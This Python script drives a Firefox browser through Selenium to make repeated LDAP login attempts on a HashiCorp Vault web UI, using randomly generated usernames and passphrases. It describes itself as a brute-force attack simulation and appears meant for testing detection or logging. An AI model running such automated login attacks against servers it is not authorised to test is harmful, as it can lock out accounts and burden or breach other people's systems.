#!/usr/bin/env python

import argparse
import fraise
from selenium import webdriver
import time

def attack(attempts, pause, url):
    xpaths = {
        'ldap_button':  '/html/body/div[2]/div/div[2]/div/div/div[1]/div[3]/nav/ul/li[3]/a',
        'username_field': '//*[@id="username"]',
        'password_field': '//*[@id="password"]',
        'signin_button': '//*[@id="auth-submit"]'
    }
    firefox_driver = webdriver.Firefox()
    firefox_driver.get(url)
    firefox_driver.maximize_window()
    firefox_driver.find_element_by_xpath(xpaths['ldap_button']).click()
    for attempt in range(1, attempts + 1):
        username = "{}.{}@{}.com".format(
            fraise.generate(word_count=1),
            fraise.generate(word_count=1),
            fraise.generate(word_count=1)
        )
        password = fraise.generate()
        print("Attempt: {} - {} - {}".format(attempt, username, password))
        firefox_driver.find_element_by_xpath(xpaths['username_field']).clear()
        firefox_driver.find_element_by_xpath(xpaths['username_field']).send_keys(username)
        firefox_driver.find_element_by_xpath(xpaths['password_field']).clear()
        firefox_driver.find_element_by_xpath(xpaths['password_field']).send_keys(password)
        firefox_driver.find_element_by_xpath(xpaths['signin_button']).click()
        time.sleep(float(pause/1000))
    firefox_driver.close()

# Parse commandline arguments
def parse_args():
    argparser = argparse.ArgumentParser(description='Simulate a brute force attack on a Hashicorp Vault server')
    argparser.add_argument(
        '--attempts',
        type=int,
        required=True,
        dest='attempts',
        help='Total number of login attempts to make'
    )
    argparser.add_argument(
        '--pause',
        type=int,
        required=True,
        dest='pause',
        help='Time in milliseconds to wait between each attempt'
    )
    argparser.add_argument(
        '--url',
        type=str,
        required=True,
        dest='url',
        help='URL of the target Vault server UI endpoint'
    )
    return argparser.parse_args()

# Main operation
if __name__ == "__main__":
    args = parse_args()
    attack(
        attempts=args.attempts,
        pause=args.pause,
        url=args.url
    )
